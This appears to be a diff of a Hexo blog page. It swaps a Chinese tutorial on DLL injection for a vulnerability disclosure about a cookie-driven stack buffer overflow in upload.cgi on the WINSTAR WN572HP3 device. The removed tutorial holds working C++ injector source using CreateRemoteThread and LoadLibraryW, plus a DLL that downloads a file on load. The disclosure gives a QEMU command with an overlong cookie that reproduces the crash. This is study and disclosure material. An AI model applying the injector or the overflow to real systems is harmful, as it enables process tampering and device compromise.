@@ -16,21 +16,27 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="DLL 注入DLL 注入是命令其他进程自行调用LoadLibrary() API加载用户指定的DLL，加载DLL的过程中会自动调用DllMain()函数，从而实现各种功能 DLL的实现方法  创建远程线程(CreateRemoteThread) 使用注册表(AppInit_Dlls) 消息勾取(SetWindowsHookEx() API)  CreateRemoteThread()主程序 123">
+    <meta name="description" content="WINSTAR_WN572HP3 introducedWN572HP3 is designed for WISP CPE and long distance wireless network, making it an ideal solution for small business offices and the home with outdoor networking requirement">
 <meta property="og:type" content="article">
-<meta property="og:title" content="dll注入">
-<meta property="og:url" content="https://lafdrew.github.io/2024/06/24/dll%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:title" content="Buffer Overflow in upload.cgi of WINSTAR_WN572HP3 Device">
+<meta property="og:url" content="https://lafdrew.github.io/2025/03/17/Buffer%20Overflow%20in%20upload.cgi%20of%20WINSTAR_WN572HP3%20Device/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="DLL 注入DLL 注入是命令其他进程自行调用LoadLibrary() API加载用户指定的DLL，加载DLL的过程中会自动调用DllMain()函数，从而实现各种功能 DLL的实现方法  创建远程线程(CreateRemoteThread) 使用注册表(AppInit_Dlls) 消息勾取(SetWindowsHookEx() API)  CreateRemoteThread()主程序 123">
+<meta property="og:description" content="WINSTAR_WN572HP3 introducedWN572HP3 is designed for WISP CPE and long distance wireless network, making it an ideal solution for small business offices and the home with outdoor networking requirement">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2024-06-23T16:29:13.000Z">
-<meta property="article:modified_time" content="2024-06-24T16:50:26.937Z">
+<meta property="og:image" content="https://lafdrew.github.io/res/image-20250317214211270.png">
+<meta property="og:image" content="https://lafdrew.github.io/res/image-20250317214843356.png">
+<meta property="og:image" content="https://lafdrew.github.io/res/image-20250317215653742.png">
+<meta property="og:image" content="https://lafdrew.github.io/res/image-20250317215602707.png">
+<meta property="article:published_time" content="2025-03-17T13:19:59.000Z">
+<meta property="article:modified_time" content="2025-03-17T14:34:00.559Z">
 <meta property="article:author" content="John Doe">
+<meta property="article:tag" content="cve">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://lafdrew.github.io/res/image-20250317214211270.png">
   
   
   
-  <title>dll注入 - Hexo</title>
+  <title>Buffer Overflow in upload.cgi of WINSTAR_WN572HP3 Device - Hexo</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -188,7 +194,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="dll注入"></span>
+            <span id="subtitle" data-typed-text="Buffer Overflow in upload.cgi of WINSTAR_WN572HP3 Device"></span>
           
         </div>
 
@@ -199,8 +205,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-06-24 00:29" pubdate>
-          June 24, 2024 am
+        <time datetime="2025-03-17 21:19" pubdate>
+          March 17, 2025 pm
         </time>
       </span>
     
@@ -211,7 +217,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          447 words
+          60 words
         
       </span>
     
@@ -222,7 +228,7 @@
         
         
         
-          4 mins
+          1 mins
         
       </span>
     
@@ -259,28 +265,25 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">dll注入</h1>
+            <h1 id="seo-header">Buffer Overflow in upload.cgi of WINSTAR_WN572HP3 Device</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="DLL-注入"><a href="#DLL-注入" class="headerlink" title="DLL 注入"></a>DLL 注入</h1><p>DLL 注入是命令其他进程自行调用LoadLibrary() API加载用户指定的DLL，加载DLL的过程中会自动调用DllMain()函数，从而实现各种功能</p>
-<p>DLL的实现方法</p>
-<ul>
-<li>创建远程线程(CreateRemoteThread)</li>
-<li>使用注册表(AppInit_Dlls)</li>
-<li>消息勾取(SetWindowsHookEx() API)</li>
-</ul>
-<h2 id="CreateRemoteThread"><a href="#CreateRemoteThread" class="headerlink" title="CreateRemoteThread()"></a>CreateRemoteThread()</h2><p>主程序</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// InjectDll.cpp</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdio&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;windows.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;tchar.h&quot;</span></span><br><br><span class="hljs-function">BOOL <span class="hljs-title">InjectDll</span><span class="hljs-params">(DWORD dwPID, LPCTSTR szDllPath)</span></span><br><span class="hljs-function"></span>&#123;<br>    HANDLE hProcess = <span class="hljs-literal">NULL</span>, hThread = <span class="hljs-literal">NULL</span>;<br>    HMODULE hMod = <span class="hljs-literal">NULL</span>;<br>    LPVOID pRemoteBuf = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-comment">//确定路径需要占用的缓冲区大小</span><br>    DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + <span class="hljs-number">1</span>) * <span class="hljs-built_in">sizeof</span>(TCHAR);<br>    LPTHREAD_START_ROUTINE pThreadProc;<br><br>    <br>    <span class="hljs-keyword">if</span> (!(hProcess = <span class="hljs-built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPID)))<br>    &#123;<br>        _tprintf(<span class="hljs-string">&quot;OpenProcess(%d) failed!!! [%d]\n&quot;</span>, dwPID, <span class="hljs-built_in">GetLastError</span>());<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    <br>    pRemoteBuf = <span class="hljs-built_in">VirtualAllocEx</span>(hProcess, <span class="hljs-literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);<br><br>    <br>    <span class="hljs-built_in">WriteProcessMemory</span>(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, <span class="hljs-literal">NULL</span>);<br><br>    <br>    hMod = <span class="hljs-built_in">GetModuleHandle</span>(<span class="hljs-string">&quot;kernel32.dll&quot;</span>);<br>    pThreadProc = (LPTHREAD_START_ROUTINE)<span class="hljs-built_in">GetProcAddress</span>(hMod, <span class="hljs-string">&quot;LoadLibraryW&quot;</span>);<br><br>   <br>    hThread = <span class="hljs-built_in">CreateRemoteThread</span>(hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, pThreadProc, pRemoteBuf, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">WaitForSingleObject</span>(hThread, INFINITE);<br><br>   <br>    <span class="hljs-built_in">CloseHandle</span>(hThread);<br>    <span class="hljs-built_in">CloseHandle</span>(hProcess);<br><br>    <span class="hljs-keyword">return</span> TRUE;<br><br>&#125;<br><br><span class="hljs-type">int</span> _tmain(<span class="hljs-type">int</span> argc, TCHAR* argv[])<br>&#123;<br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">3</span>)<br>    &#123;<br>        _tprintf(<span class="hljs-string">&quot;USAGE : %s &lt;pid&gt; &lt;dll_path&gt;\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// inject dll</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">InjectDll</span>((DWORD)_tstol(argv[<span class="hljs-number">1</span>]), argv[<span class="hljs-number">2</span>]))<br>        _tprintf(<span class="hljs-string">&quot;InjectDll(\&quot;%s\&quot;) success!!!\n&quot;</span>, argv[<span class="hljs-number">2</span>]);<br>    <span class="hljs-keyword">else</span><br>        _tprintf(<span class="hljs-string">&quot;InjectDll(\&quot;%s\&quot;) failed!!!\n&quot;</span>, argv[<span class="hljs-number">2</span>]);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br><br></code></pre></td></tr></table></figure>
-
-<p>DLL download index.html </p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// myhack.cpp</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;windows.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;tchar.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">&quot;urlmon.lib&quot;</span>)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEF_URL             (<span class="hljs-string">&quot;http://www.naver.com/index.html&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEF_FILE_NAME   (<span class="hljs-string">&quot;index.html&quot;</span>)</span><br><br>HMODULE g_hMod = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-function">DWORD WINAPI <span class="hljs-title">ThreadProc</span><span class="hljs-params">(LPVOID lParam)</span></span><br><span class="hljs-function"></span>&#123;<br>    TCHAR szPath[_MAX_PATH] = &#123; <span class="hljs-number">0</span>, &#125;;<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">GetModuleFileName</span>(g_hMod, szPath, MAX_PATH))<br>        <span class="hljs-keyword">return</span> FALSE;<br><br>    TCHAR* p = _tcsrchr(szPath, <span class="hljs-string">&#x27;\\&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (!p)<br>        <span class="hljs-keyword">return</span> FALSE;<br><br>    _tcscpy_s(p + <span class="hljs-number">1</span>, _MAX_PATH, DEF_FILE_NAME); <span class="hljs-comment">//参数准备</span><br><br>    <span class="hljs-built_in">URLDownloadToFile</span>(<span class="hljs-literal">NULL</span>, DEF_URL, szPath, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">//调用函数进行URL下载</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br><br><span class="hljs-function">BOOL WINAPI <span class="hljs-title">DllMain</span><span class="hljs-params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span></span><br><span class="hljs-function"></span>&#123;<br>    HANDLE hThread = <span class="hljs-literal">NULL</span>;<br><br>    g_hMod = (HMODULE)hinstDLL;<br><br>    <span class="hljs-keyword">switch</span> (fdwReason)<br>    &#123;<br>        <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>            <span class="hljs-built_in">OutputDebugString</span>(<span class="hljs-string">&quot;&lt;myhack.dll&gt; Injection!!!&quot;</span>);<br><br>           hThread = <span class="hljs-built_in">CreateThread</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, ThreadProc, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br><br><br>         <span class="hljs-built_in">CloseHandle</span>(hThread);<br>         <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> TRUE;<br><br>&#125;<br><br></code></pre></td></tr></table></figure>
+                <h1 id="WINSTAR-WN572HP3-introduced"><a href="#WINSTAR-WN572HP3-introduced" class="headerlink" title="WINSTAR_WN572HP3 introduced"></a>WINSTAR_WN572HP3 introduced</h1><p>WN572HP3 is designed for WISP CPE and long distance wireless network, making it an ideal solution for small business offices and the home with outdoor networking requirements. This High power outdoor Wi-Fi range extender is specifically designed to provide an effective solution for outdoor wireless networking applications. With its centralized management platform and high degree of flexibility, it is the ideal choice for providing point-to-point, point-to-multipoint, and outdoor Wi-Fi coverage.</p>
+<h1 id="Description"><a href="#Description" class="headerlink" title="Description:"></a><strong>Description</strong>:</h1><p>A buffer overflow vulnerability exists in the Lighttpd web service component of the WINSTAR_WN572HP3 device, specifically within the <code>/etc/lighttpd/www/cgi-bin/upload.cgi</code> file. The vulnerability occurs when processing HTTP requests due to the insecure use of the <code>strcpy</code> function to copy untrusted data from the <code>HTTP_COOKIE</code> environment variable (retrieved via <code>getenv(&quot;HTTP_COOKIE&quot;)</code>) into a fixed-size stack buffer without proper bounds checking. An attacker can exploit this by crafting a malicious HTTP request with an excessively long Cookie value, leading to stack overflow. This may overwrite critical memory structures (e.g., return addresses), resulting in arbitrary code execution or denial of service (DoS).</p>
+<h1 id="exploit："><a href="#exploit：" class="headerlink" title="exploit："></a>exploit：</h1><p>use of the <code>strcpy</code> function to copy untrusted data from the <code>HTTP_COOKIE</code> environment variable (retrieved via <code>getenv(&quot;HTTP_COOKIE&quot;)</code>) into a fixed-size stack buffer without proper bounds checking. </p>
+<p><img src="/../res/image-20250317214211270.png" srcset="/img/loading.gif" lazyload alt="image-20250317214211270"></p>
+<p>Simulations were performed using the QUME</p>
+<p><img src="/../res/image-20250317214843356.png" srcset="/img/loading.gif" lazyload alt="image-20250317214843356"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo chroot . .<span class="hljs-regexp">/qemu-mipsel-static -g 1234 -E HTTP_COOKIE=1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111 ./</span>etc<span class="hljs-regexp">/lighttpd/</span>www<span class="hljs-regexp">/cgi-bin/u</span>pload.cgi<br></code></pre></td></tr></table></figure>
 
 
-<h2 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h2><p>windows 操作系统默认提供了AppInit_Dlls和LoadAppInit_Dlls两个注册表，当User32.dll被加载到到进程中，会读取Appinit表中的dll中，加载到进程中。所以可以利用这个特性加载任意的Dll。</p>
-<p>User32.dll是windows图形界面的主要支持。是非常常见的Dll。</p>
-<h2 id="SetWindowsHookEx"><a href="#SetWindowsHookEx" class="headerlink" title="SetWindowsHookEx()"></a>SetWindowsHookEx()</h2>
+
+<p>The requested stack space is 0x178 overflow to 0x1e9</p>
+<p><img src="/../res/image-20250317215653742.png" srcset="/img/loading.gif" lazyload alt="image-20250317215653742"></p>
+<p><img src="/../res/image-20250317215602707.png" srcset="/img/loading.gif" lazyload alt="image-20250317215602707"></p>
+
                 
               </div>
             
@@ -288,27 +291,13 @@
             <div>
               <div class="post-metas my-3">
   
-    <div class="post-meta mr-3 d-flex align-items-center">
-      <i class="iconfont icon-category"></i>
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
       
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/RE/" class="category-chain-item">RE</a>
-  
-  
-
-      </span>
-    
-  
-</span>
-
+        <a href="/tags/cve/" class="print-no-link">#cve</a>
+      
     </div>
-  
   
 </div>
 
@@ -318,8 +307,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>dll注入</div>
-      <div>https://lafdrew.github.io/2024/06/24/dll注入/</div>
+      <div>Buffer Overflow in upload.cgi of WINSTAR_WN572HP3 Device</div>
+      <div>https://lafdrew.github.io/2025/03/17/Buffer Overflow in upload.cgi of WINSTAR_WN572HP3 Device/</div>
     </div>
     <div class="license-meta">
       
@@ -331,7 +320,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>June 24, 2024</div>
+          <div>March 17, 2025</div>
         </div>
       
       
@@ -363,18 +352,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/11/05/%E6%96%87%E4%BB%B6%E5%9E%8B%E7%97%85%E6%AF%92/" title="文件型病毒">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">文件型病毒</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/06/19/mini-L/" title="mini-L">
-                        <span class="hidden-mobile">mini-L</span>
+                      <a href="/2024/11/05/%E6%96%87%E4%BB%B6%E5%9E%8B%E7%97%85%E6%AF%92/" title="文件型病毒">
+                        <span class="hidden-mobile">文件型病毒</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
